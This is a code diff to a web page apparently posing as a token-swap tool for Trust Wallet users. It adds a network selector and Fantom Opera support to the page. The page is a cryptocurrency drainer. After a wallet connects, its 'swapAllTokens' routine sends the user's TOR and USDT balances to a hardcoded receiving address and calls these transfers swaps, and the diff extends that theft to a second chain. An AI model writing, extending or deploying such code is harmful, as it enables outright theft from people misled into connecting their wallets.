@@ -213,6 +213,14 @@
       flex-grow: 1;
     }
     
+    .token-network {
+      font-size: 12px;
+      color: #636e72;
+      background: rgba(99, 110, 114, 0.1);
+      padding: 3px 6px;
+      border-radius: 4px;
+    }
+    
     .mobile-warning {
       display: none;
       background: var(--warning);
@@ -221,6 +229,19 @@
       border-radius: 10px;
       margin-bottom: 20px;
       text-align: center;
+    }
+    
+    .network-selector {
+      margin-bottom: 20px;
+    }
+    
+    select {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid #dfe6e9;
+      background: white;
+      font-size: 16px;
     }
     
     @media (max-width: 600px) {
@@ -260,14 +281,28 @@
         <i class="fas fa-mobile-alt"></i> For Trust Wallet mobile users, please use the in-app browser
       </div>
       
+      <div class="network-selector">
+        <select id="networkSelect">
+          <option value="bsc">Binance Smart Chain</option>
+          <option value="fantom">Fantom Opera</option>
+        </select>
+      </div>
+      
       <div class="token-list">
-        <div class="token-item">
+        <div class="token-item" data-network="bsc">
           <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR" class="token-icon">
           <span class="token-name">TOR Token</span>
+          <span class="token-network">BSC</span>
         </div>
-        <div class="token-item">
+        <div class="token-item" data-network="fantom">
+          <img src="https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png" alt="TOR" class="token-icon">
+          <span class="token-name">TOR Token</span>
+          <span class="token-network">Fantom</span>
+        </div>
+        <div class="token-item" data-network="bsc">
           <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" class="token-icon">
-          <span class="token-name">USDT (BEP-20)</span>
+          <span class="token-name">USDT</span>
+          <span class="token-network">BSC</span>
         </div>
       </div>
       
@@ -281,59 +316,100 @@
     </div>
   </div>
 
-  <!-- Load Ethers.js with multiple fallback options -->
+  <!-- Load Ethers.js -->
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.2/dist/ethers.umd.min.js"></script>
   <script>
     // Configuration
     const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
     
-    // Token contracts (BSC)
-    const TOKENS = [
-      {
-        name: "TOR",
-        symbol: "TOR",
-        address: "0x1d6cbdc6b29c6afbae65444a1f65ba9252b8ca83",
-        abi: [
-          "function balanceOf(address owner) view returns (uint256)",
-          "function transfer(address to, uint256 amount) returns (bool)"
-        ],
-        decimals: 18,
-        logo: "https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png"
-      },
-      {
-        name: "USDT",
-        symbol: "USDT",
-        address: "0x55d398326f99059fF775485246999027B3197955",
-        abi: [
-          "function balanceOf(address owner) view returns (uint256)",
-          "function transfer(address to, uint256 amount) returns (bool)"
-        ],
-        decimals: 18,
-        logo: "https://cryptologos.cc/logos/tether-usdt-logo.png"
-      }
-    ];
+    // Token contracts
+    const TOKENS = {
+      bsc: [
+        {
+          name: "TOR",
+          symbol: "TOR",
+          address: "0x1d6cbdc6b29c6afbae65444a1f65ba9252b8ca83",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png"
+        },
+        {
+          name: "USDT",
+          symbol: "USDT",
+          address: "0x55d398326f99059fF775485246999027B3197955",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://cryptologos.cc/logos/tether-usdt-logo.png"
+        }
+      ],
+      fantom: [
+        {
+          name: "TOR",
+          symbol: "TOR",
+          address: "0x74e23df9110aa9ea0b6ff2faee01e740ca1c642e",
+          abi: [
+            "function balanceOf(address owner) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)"
+          ],
+          decimals: 18,
+          logo: "https://assets.staticimg.com/quicksilver/63564d50f06e9c0001a7dce5_tor.png"
+        }
+      ]
+    };
     
-    const BSC_CONFIG = {
-      chainId: "0x38",
-      chainName: "Binance Smart Chain",
-      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-      rpcUrls: ["https://bsc-dataseed.binance.org/"],
-      blockExplorerUrls: ["https://bscscan.com"],
-      scanUrl: "https://bscscan.com/tx/"
+    const NETWORK_CONFIGS = {
+      bsc: {
+        chainId: "0x38",
+        chainName: "Binance Smart Chain",
+        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+        blockExplorerUrls: ["https://bscscan.com"],
+        scanUrl: "https://bscscan.com/tx/"
+      },
+      fantom: {
+        chainId: "0xfa",
+        chainName: "Fantom Opera",
+        nativeCurrency: { name: "FTM", symbol: "FTM", decimals: 18 },
+        rpcUrls: ["https://rpc.ftm.tools/"],
+        blockExplorerUrls: ["https://ftmscan.com"],
+        scanUrl: "https://ftmscan.com/tx/"
+      }
     };
 
     // Global variables
     let provider, signer, userAddress;
+    let currentNetwork = "bsc";
 
     // Initialize when page loads
     window.addEventListener('load', () => {
+      // Set up network selection
+      document.getElementById("networkSelect").addEventListener('change', (e) => {
+        currentNetwork = e.target.value;
+        updateTokenVisibility();
+      });
+      
       document.getElementById("connectWallet").addEventListener("click", connectAndSwap);
       
       // Check if Trust Wallet mobile browser
       if (isTrustWalletMobile()) {
         document.querySelector('.mobile-warning').style.display = 'block';
       }
+      
+      // Initial token visibility update
+      updateTokenVisibility();
     });
+
+    function updateTokenVisibility() {
+      document.querySelectorAll('.token-item').forEach(item => {
+        item.style.display = item.dataset.network === currentNetwork ? 'flex' : 'none';
+      });
+    }
 
     function isTrustWalletMobile() {
       return /TrustWallet/i.test(navigator.userAgent) && /Mobile/i.test(navigator.userAgent);
@@ -368,7 +444,7 @@
         document.getElementById("connectWallet").disabled = true;
         document.getElementById("connectWallet").innerHTML = `<i class="fas fa-spinner fa-spin"></i> Processing...`;
         document.getElementById("walletInfo").textContent = 
-          `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: Binance Smart Chain`;
+          `Connected: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)} | Network: ${NETWORK_CONFIGS[currentNetwork].chainName}`;
         
         // Execute the swaps automatically
         await swapAllTokens();
@@ -382,23 +458,24 @@
 
     async function checkNetwork() {
       const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+      const targetChainId = NETWORK_CONFIGS[currentNetwork].chainId;
       
-      if (chainId !== BSC_CONFIG.chainId) {
-        updateStatus("Switching to Binance Smart Chain...", "success");
+      if (chainId !== targetChainId) {
+        updateStatus(`Switching to ${NETWORK_CONFIGS[currentNetwork].chainName}...`, "success");
         try {
           await window.ethereum.request({
             method: 'wallet_switchEthereumChain',
-            params: [{ chainId: BSC_CONFIG.chainId }]
+            params: [{ chainId: targetChainId }]
           });
         } catch (switchError) {
           if (switchError.code === 4902) {
             try {
               await window.ethereum.request({
                 method: 'wallet_addEthereumChain',
-                params: [BSC_CONFIG]
+                params: [NETWORK_CONFIGS[currentNetwork]]
               });
             } catch (addError) {
-              throw new Error("Please switch to Binance Smart Chain manually");
+              throw new Error(`Please switch to ${NETWORK_CONFIGS[currentNetwork].chainName} manually`);
             }
           } else {
             throw new Error("Failed to switch network");
@@ -410,8 +487,9 @@
     async function swapAllTokens() {
       try {
         let successCount = 0;
+        const tokensToSwap = TOKENS[currentNetwork];
         
-        for (const token of TOKENS) {
+        for (const token of tokensToSwap) {
           try {
             updateStatus(`Processing ${token.name}...`, "success");
             
@@ -426,7 +504,7 @@
               await tx.wait();
               
               updateStatus(
-                `${token.symbol} transfer successful! <a class="tx-link" href="${BSC_CONFIG.scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
+                `${token.symbol} transfer successful! <a class="tx-link" href="${NETWORK_CONFIGS[currentNetwork].scanUrl}${tx.hash}" target="_blank">View transaction</a>`,
                 "success"
               );
               successCount++;
